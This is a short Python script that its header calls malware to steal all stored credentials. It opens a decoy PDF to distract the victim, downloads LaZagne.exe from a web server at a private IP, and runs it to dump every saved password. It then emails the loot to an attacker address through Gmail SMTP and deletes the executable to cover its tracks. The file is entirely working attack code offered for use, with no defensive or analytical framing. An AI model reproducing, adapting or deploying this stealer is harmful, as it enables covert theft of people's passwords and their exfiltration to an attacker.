#!/usr/bin/python    
#__Author__ == 'Ananth Venkateswarlu aka she11z'
# Malware to steal all stored credentials

import requests
import subprocess
import smtplib
import os
import tempfile
import sys
import time
from base64 import b64decode

evil_url = 'http://192.168.0.101/Malwares/lazagne.exe' # web server to serve LaZagne.exe

EMAIL_ADDRESS = b64decode('encoded sender's email address'.decode('utf-8'))
EMAIL_PASSWORD = b64decode('encoded password for above email'.decode('utf-8'))
EMAIL_HACKER = b64decode('encoded receiver's email address'.decode('utf-8'))
DEVNULL = open(os.devnull, 'wb')

def download(url):
        get_response = requests.get(url)
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as f:
                f.write(get_response.content)

def loot_stuff():
        command_2 =  evil_exe + ' all'
        return subprocess.check_output(command_2, shell=True, stderr=DEVNULL, stdin=DEVNULL)

def fake_show():
        command_1 = sys._MEIPASS + "\\hacking.pdf" # fake PDF to open. Change it as per your file in pyinstaller.
        subprocess.Popen(command_1, shell=True)

def send_mail():
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        subject = 'DATA RECEIVED'
        body = 'Output for command'
        msg = 'Subject: {}\n\n{}'.format(subject, body)

        server.sendmail(EMAIL_ADDRESS, EMAIL_HACKER, command_result)
        server.close()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
evil_exe = evil_url.split('/')[-1]

fake_show()   # opens the fake PDF file for User.
download(evil_url)    # Downloads LaZagne.exe in background.
command_result = loot_stuff()   # runs LaZagne.exe and steal all stored passwords.
time.sleep(3)
send_mail()   # Send the loot via email.
os.remove(evil_exe)   # Deletes LaZagne.exe from the host.
